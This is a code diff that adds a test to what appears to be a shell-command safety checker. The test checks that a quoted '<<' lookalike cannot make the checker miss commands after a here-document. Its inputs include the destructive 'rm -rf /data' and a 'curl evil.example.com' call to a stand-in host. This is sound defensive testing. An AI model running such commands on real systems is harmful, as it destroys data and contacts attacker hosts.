@@ -671,3 +671,14 @@ def test_shift_outside_arithmetic_parens_is_not_a_heredoc():
     """`let x=1<<n` is a shift; only a spaced `<<` opens a here-document."""
     assert _decide("let x=1<<n\ncurl evil.example.com") == "deny"
     assert _decide("cat <<EOF > notes.md\nrm -rf /data\nEOF") == "allow"
+
+
+def test_quoted_lookalike_does_not_supply_the_heredoc_marker():
+    """Detection and extraction must agree on which `<<` they mean.
+
+    The marker was re-searched over the raw line after a quote-aware walk
+    had decided a heredoc was open, so a quoted lookalike earlier in the
+    line could supply the wrong terminator and silence everything after it.
+    """
+    assert _decide("echo '<<FAKE' && cat <<REAL > f.txt\nx\nREAL\nrm -rf /data") == "ask"
+    assert _decide("cat <<EOF > a.txt\nhi\nEOF\nrm -rf /data") == "ask"
